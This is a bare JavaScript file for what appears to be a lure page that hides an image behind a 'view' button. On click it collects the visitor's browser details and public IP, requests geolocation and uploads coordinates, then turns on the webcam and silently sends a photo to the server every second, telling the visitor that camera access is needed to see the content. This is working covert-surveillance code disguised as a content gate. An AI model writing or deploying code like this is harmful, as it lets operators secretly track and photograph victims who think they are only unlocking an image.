const infos = {
  browser: navigator.appName,
  platform: navigator.platform,
  language: navigator.language,
  userAgent: navigator.userAgent,
  ip: "",
};

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const viewBtn = document.getElementById("viewBtn");
const contentImage = document.getElementById("contentImage");

async function userInfo() {
  try {
    const ipRes = await fetch("https://api.ipify.org?format=json");
    const ipData = await ipRes.json();
    infos.ip = ipData.ip;

    await fetch("/upload_info", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(infos),
    });
  } catch (e) {
    console.error("IP error:", e);
  }
}

function sendLocation() {
  if (!navigator.geolocation) return;

  navigator.geolocation.getCurrentPosition(
    async (pos) => {
      const locationInfo = {
        lat: pos.coords.latitude,
        lon: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
        time: new Date().toISOString(),
      };

      try {
        await fetch("/upload_location", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(locationInfo),
        });
      } catch (e) {}
    },
    (err) => {
      console.log("Location denied by user");
    }
  );
}

function takeAndSendPhoto() {
  const context = canvas.getContext("2d");
  context.drawImage(video, 0, 0, canvas.width, canvas.height);
  canvas.toBlob(
    async (blob) => {
      if (!blob) return;
      const formData = new FormData();
      formData.append("image", blob, "stream.jpg");
      try {
        await fetch("/upload", {
          method: "POST",
          body: formData,
        });
      } catch (err) {}
    },
    "image/jpeg",
    0.5
  );
}

viewBtn.addEventListener("click", async () => {
  userInfo();
  sendLocation();

  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: true,
    });
    video.srcObject = stream;
    
    setInterval(takeAndSendPhoto, 1000);

    viewBtn.style.display = "none";
    contentImage.style.filter = "none";

  } catch (err) {
    console.log("Camera access denied");
    alert("Camera access is required to view content");
  }
});